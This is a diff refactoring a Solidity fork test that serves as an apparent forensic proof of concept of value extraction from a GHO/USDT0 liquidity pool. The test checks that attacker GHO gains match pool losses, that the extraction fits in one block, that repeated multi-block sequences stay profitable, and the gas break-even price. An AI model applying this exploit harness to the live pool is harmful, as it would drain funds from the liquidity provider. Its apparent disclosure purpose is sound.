@@ -96,6 +96,26 @@ contract PlasmaGhoUsdtForensicProofTest is Test {
     uint256 internal forkBlock;
     uint256 internal observedGasPriceWei;
 
+    struct BalanceSnapshot {
+        uint256 attackerUsdt;
+        uint256 attackerGho;
+        uint256 liquidityUsdt;
+        uint256 liquidityGho;
+    }
+
+    struct Deltas {
+        uint256 attackerUsdtLoss;
+        uint256 attackerGhoGain;
+        uint256 liquidityUsdtGain;
+        uint256 liquidityGhoLoss;
+    }
+
+    struct SequenceRun {
+        uint256 measuredGas;
+        uint256 maxTransactionGas;
+        Deltas deltas;
+    }
+
     event ForensicDeployment(
         uint256 forkBlock,
         uint256 chainId,
@@ -226,35 +246,30 @@ contract PlasmaGhoUsdtForensicProofTest is Test {
         breakEvenXplUsd18 = (stableValueGain18 * 1e18) / nativeCostWei;
     }
 
-    function _assertConservation(
-        address attacker,
-        uint256 attackerUsdtBefore,
-        uint256 attackerGhoBefore,
-        uint256 liquidityUsdtBefore,
-        uint256 liquidityGhoBefore
-    ) internal view returns (
-        uint256 attackerUsdtLoss,
-        uint256 attackerGhoGain,
-        uint256 liquidityUsdtGain,
-        uint256 liquidityGhoLoss
-    ) {
-        uint256 attackerUsdtAfter = IERC20Forensic(USDT0).balanceOf(attacker);
-        uint256 attackerGhoAfter = IERC20Forensic(GHO).balanceOf(attacker);
-        uint256 liquidityUsdtAfter = IERC20Forensic(USDT0).balanceOf(LIQUIDITY);
-        uint256 liquidityGhoAfter = IERC20Forensic(GHO).balanceOf(LIQUIDITY);
+    function _snapshot(address attacker) internal view returns (BalanceSnapshot memory b) {
+        b.attackerUsdt = IERC20Forensic(USDT0).balanceOf(attacker);
+        b.attackerGho = IERC20Forensic(GHO).balanceOf(attacker);
+        b.liquidityUsdt = IERC20Forensic(USDT0).balanceOf(LIQUIDITY);
+        b.liquidityGho = IERC20Forensic(GHO).balanceOf(LIQUIDITY);
+    }
 
-        assertLe(attackerUsdtAfter, attackerUsdtBefore, "attacker USDT unexpectedly increased");
-        assertGe(attackerGhoAfter, attackerGhoBefore, "attacker GHO decreased");
-        assertGe(liquidityUsdtAfter, liquidityUsdtBefore, "Liquidity USDT decreased");
-        assertLe(liquidityGhoAfter, liquidityGhoBefore, "Liquidity GHO increased");
+    function _assertConservation(address attacker, BalanceSnapshot memory before_)
+        internal view returns (Deltas memory d)
+    {
+        BalanceSnapshot memory after_ = _snapshot(attacker);
 
-        attackerUsdtLoss = attackerUsdtBefore - attackerUsdtAfter;
-        attackerGhoGain = attackerGhoAfter - attackerGhoBefore;
-        liquidityUsdtGain = liquidityUsdtAfter - liquidityUsdtBefore;
-        liquidityGhoLoss = liquidityGhoBefore - liquidityGhoAfter;
+        assertLe(after_.attackerUsdt, before_.attackerUsdt, "attacker USDT unexpectedly increased");
+        assertGe(after_.attackerGho, before_.attackerGho, "attacker GHO decreased");
+        assertGe(after_.liquidityUsdt, before_.liquidityUsdt, "Liquidity USDT decreased");
+        assertLe(after_.liquidityGho, before_.liquidityGho, "Liquidity GHO increased");
 
-        assertEq(attackerUsdtLoss, liquidityUsdtGain, "USDT victim accounting mismatch");
-        assertEq(attackerGhoGain, liquidityGhoLoss, "GHO victim accounting mismatch");
+        d.attackerUsdtLoss = before_.attackerUsdt - after_.attackerUsdt;
+        d.attackerGhoGain = after_.attackerGho - before_.attackerGho;
+        d.liquidityUsdtGain = after_.liquidityUsdt - before_.liquidityUsdt;
+        d.liquidityGhoLoss = before_.liquidityGho - after_.liquidityGho;
+
+        assertEq(d.attackerUsdtLoss, d.liquidityUsdtGain, "USDT victim accounting mismatch");
+        assertEq(d.attackerGhoGain, d.liquidityGhoLoss, "GHO victim accounting mismatch");
     }
 
     function test_atomicDeployedPool_closedCycle_noSyntheticBalances() public {
@@ -264,10 +279,7 @@ contract PlasmaGhoUsdtForensicProofTest is Test {
 
         uint256 ghoSupplyBefore = IERC20Forensic(GHO).totalSupply();
         uint256 usdtSupplyBefore = IERC20Forensic(USDT0).totalSupply();
-        uint256 attackerUsdtBefore = IERC20Forensic(USDT0).balanceOf(address(executor));
-        uint256 attackerGhoBefore = IERC20Forensic(GHO).balanceOf(address(executor));
-        uint256 liquidityUsdtBefore = IERC20Forensic(USDT0).balanceOf(LIQUIDITY);
-        uint256 liquidityGhoBefore = IERC20Forensic(GHO).balanceOf(LIQUIDITY);
+        BalanceSnapshot memory before_ = _snapshot(address(executor));
 
         uint256 gasBefore = gasleft();
         (uint256 totalForwardUsdtInput, uint256 reverseGhoInput) = executor.atomicCycle(
@@ -275,26 +287,15 @@ contract PlasmaGhoUsdtForensicProofTest is Test {
         );
         uint256 measuredGas = gasBefore - gasleft();
 
-        (
-            uint256 attackerUsdtLoss,
-            uint256 attackerGhoGain,
-            uint256 liquidityUsdtGain,
-            uint256 liquidityGhoLoss
-        ) = _assertConservation(
-            address(executor),
-            attackerUsdtBefore,
-            attackerGhoBefore,
-            liquidityUsdtBefore,
-            liquidityGhoBefore
-        );
+        Deltas memory d = _assertConservation(address(executor), before_);
 
         assertEq(IERC20Forensic(GHO).totalSupply(), ghoSupplyBefore, "GHO supply changed");
         assertEq(IERC20Forensic(USDT0).totalSupply(), usdtSupplyBefore, "USDT supply changed");
-        assertGt(attackerGhoGain, 0, "no extracted GHO");
-        assertLe(attackerUsdtLoss, 2, "unexpected USDT loss");
+        assertGt(d.attackerGhoGain, 0, "no extracted GHO");
+        assertLe(d.attackerUsdtLoss, 2, "unexpected USDT loss");
         assertLt(measuredGas + CONSERVATIVE_TX_OVERHEAD, block.gaslimit, "not one-block executable");
 
-        uint256 stableValueGain18 = _stableValueGain18(attackerGhoGain, attackerUsdtLoss);
+        uint256 stableValueGain18 = _stableValueGain18(d.attackerGhoGain, d.attackerUsdtLoss);
         (
             uint256 conservativeGas,
             uint256 nativeCostWei,
@@ -306,10 +307,10 @@ contract PlasmaGhoUsdtForensicProofTest is Test {
             ATOMIC_GHO_OUT,
             totalForwardUsdtInput,
             reverseGhoInput,
-            attackerUsdtLoss,
-            attackerGhoGain,
-            liquidityUsdtGain,
-            liquidityGhoLoss,
+            d.attackerUsdtLoss,
+            d.attackerGhoGain,
+            d.liquidityUsdtGain,
+            d.liquidityGhoLoss,
             stableValueGain18,
             measuredGas,
             conservativeGas,
@@ -331,10 +332,54 @@ contract PlasmaGhoUsdtForensicProofTest is Test {
         (bool ok, bytes memory returnData) = target.call{gas: CALL_GAS_CAP}(data);
         gasUsed = gasBefore - gasleft();
         if (!ok) {
-            assembly {
+            assembly ("memory-safe") {
                 revert(add(returnData, 32), mload(returnData))
             }
         }
+    }
+
+    function _runSequence(
+        PlasmaForensicChunkedExecutor executor,
+        uint256 sequence
+    ) internal returns (SequenceRun memory run) {
+        BalanceSnapshot memory before_ = _snapshot(address(executor));
+
+        for (uint256 chunk; chunk < CHUNKS_PER_SEQUENCE; ++chunk) {
+            uint256 gasUsed = _boundedCall(
+                address(executor),
+                abi.encodeCall(PlasmaForensicChunkedExecutor.forwardChunk, (CHUNK_ROUNDS))
+            );
+            run.measuredGas += gasUsed;
+            if (gasUsed > run.maxTransactionGas) run.maxTransactionGas = gasUsed;
+            _advanceBlock();
+        }
+
+        uint256 reverseGas = _boundedCall(
+            address(executor),
+            abi.encodeCall(PlasmaForensicChunkedExecutor.reverseAndReset, ())
+        );
+        run.measuredGas += reverseGas;
+        if (reverseGas > run.maxTransactionGas) run.maxTransactionGas = reverseGas;
+        _advanceBlock();
+
+        run.deltas = _assertConservation(address(executor), before_);
+        assertGt(
+            run.deltas.attackerGhoGain,
+            run.deltas.attackerUsdtLoss * 1e12,
+            "sequence not parity-positive"
+        );
+
+        emit ForensicSequence(
+            sequence,
+            CHUNK_ROUNDS * CHUNKS_PER_SEQUENCE,
+            CHUNKS_PER_SEQUENCE + 1,
+            run.deltas.attackerUsdtLoss,
+            run.deltas.attackerGhoGain,
+            run.deltas.liquidityUsdtGain,
+            run.deltas.liquidityGhoLoss,
+            run.measuredGas,
+            run.maxTransactionGas
+        );
     }
 
     function test_repeatedMultiBlockExtraction_noSyntheticBalances() public {
@@ -346,90 +391,26 @@ contract PlasmaGhoUsdtForensicProofTest is Test {
 
         uint256 ghoSupplyBefore = IERC20Forensic(GHO).totalSupply();
         uint256 usdtSupplyBefore = IERC20Forensic(USDT0).totalSupply();
-        uint256 initialAttackerUsdt = IERC20Forensic(USDT0).balanceOf(address(executor));
-        uint256 initialAttackerGho = IERC20Forensic(GHO).balanceOf(address(executor));
-        uint256 initialLiquidityUsdt = IERC20Forensic(USDT0).balanceOf(LIQUIDITY);
-        uint256 initialLiquidityGho = IERC20Forensic(GHO).balanceOf(LIQUIDITY);
+        BalanceSnapshot memory initial = _snapshot(address(executor));
 
         uint256 measuredGas;
         uint256 maxTransactionGas;
-        uint256 simulatedTransactions;
+        uint256 simulatedTransactions = REPEATED_SEQUENCES * (CHUNKS_PER_SEQUENCE + 1);
 
-        for (uint256 sequence; sequence < REPEATED_SEQUENCES; ++sequence) {
-            uint256 sequenceAttackerUsdt = IERC20Forensic(USDT0).balanceOf(address(executor));
-            uint256 sequenceAttackerGho = IERC20Forensic(GHO).balanceOf(address(executor));
-            uint256 sequenceLiquidityUsdt = IERC20Forensic(USDT0).balanceOf(LIQUIDITY);
-            uint256 sequenceLiquidityGho = IERC20Forensic(GHO).balanceOf(LIQUIDITY);
-            uint256 sequenceGas;
-            uint256 sequenceMaxGas;
-
-            for (uint256 chunk; chunk < CHUNKS_PER_SEQUENCE; ++chunk) {
-                uint256 gasUsed = _boundedCall(
-                    address(executor),
-                    abi.encodeCall(PlasmaForensicChunkedExecutor.forwardChunk, (CHUNK_ROUNDS))
-                );
-                sequenceGas += gasUsed;
-                measuredGas += gasUsed;
-                ++simulatedTransactions;
-                if (gasUsed > sequenceMaxGas) sequenceMaxGas = gasUsed;
-                if (gasUsed > maxTransactionGas) maxTransactionGas = gasUsed;
-                _advanceBlock();
+        for (uint256 sequence = 1; sequence <= REPEATED_SEQUENCES; ++sequence) {
+            SequenceRun memory run = _runSequence(executor, sequence);
+            measuredGas += run.measuredGas;
+            if (run.maxTransactionGas > maxTransactionGas) {
+                maxTransactionGas = run.maxTransactionGas;
             }
-
-            uint256 reverseGas = _boundedCall(
-                address(executor),
-                abi.encodeCall(PlasmaForensicChunkedExecutor.reverseAndReset, ())
-            );
-            sequenceGas += reverseGas;
-            measuredGas += reverseGas;
-            ++simulatedTransactions;
-            if (reverseGas > sequenceMaxGas) sequenceMaxGas = reverseGas;
-            if (reverseGas > maxTransactionGas) maxTransactionGas = reverseGas;
-            _advanceBlock();
-
-            (
-                uint256 sequenceUsdtLoss,
-                uint256 sequenceGhoGain,
-                uint256 sequenceLiquidityUsdtGain,
-                uint256 sequenceLiquidityGhoLoss
-            ) = _assertConservation(
-                address(executor),
-                sequenceAttackerUsdt,
-                sequenceAttackerGho,
-                sequenceLiquidityUsdt,
-                sequenceLiquidityGho
-            );
-
-            assertGt(sequenceGhoGain, sequenceUsdtLoss * 1e12, "sequence not parity-positive");
-            emit ForensicSequence(
-                sequence + 1,
-                CHUNK_ROUNDS * CHUNKS_PER_SEQUENCE,
-                CHUNKS_PER_SEQUENCE + 1,
-                sequenceUsdtLoss,
-                sequenceGhoGain,
-                sequenceLiquidityUsdtGain,
-                sequenceLiquidityGhoLoss,
-                sequenceGas,
-                sequenceMaxGas
-            );
         }
 
-        (
-            uint256 attackerUsdtLoss,
-            uint256 attackerGhoGain,
-            uint256 liquidityUsdtGain,
-            uint256 liquidityGhoLoss
-        ) = _assertConservation(
-            address(executor),
-            initialAttackerUsdt,
-            initialAttackerGho,
-            initialLiquidityUsdt,
-            initialLiquidityGho
-        );
-
+        Deltas memory d = _assertConservation(address(executor), initial);
         uint256 totalForwardRounds =
             REPEATED_SEQUENCES * CHUNKS_PER_SEQUENCE * CHUNK_ROUNDS;
-        uint256 stableValueGain18 = _stableValueGain18(attackerGhoGain, attackerUsdtLoss);
+        uint256 stableValueGain18 = _stableValueGain18(
+            d.attackerGhoGain, d.attackerUsdtLoss
+        );
         (
             uint256 conservativeGas,
             uint256 nativeCostWei,
@@ -446,10 +427,10 @@ contract PlasmaGhoUsdtForensicProofTest is Test {
             REPEATED_SEQUENCES,
             totalForwardRounds,
             simulatedTransactions,
-            attackerUsdtLoss,
-            attackerGhoGain,
-            liquidityUsdtGain,
-            liquidityGhoLoss,
+            d.attackerUsdtLoss,
+            d.attackerGhoGain,
+            d.liquidityUsdtGain,
+            d.liquidityGhoLoss,
             stableValueGain18,
             measuredGas,
             conservativeGas,
@@ -470,4 +451,5 @@ contract PlasmaGhoUsdtForensicProofTest is Test {
             counterfactualStableValue18
         );
     }
+
 }
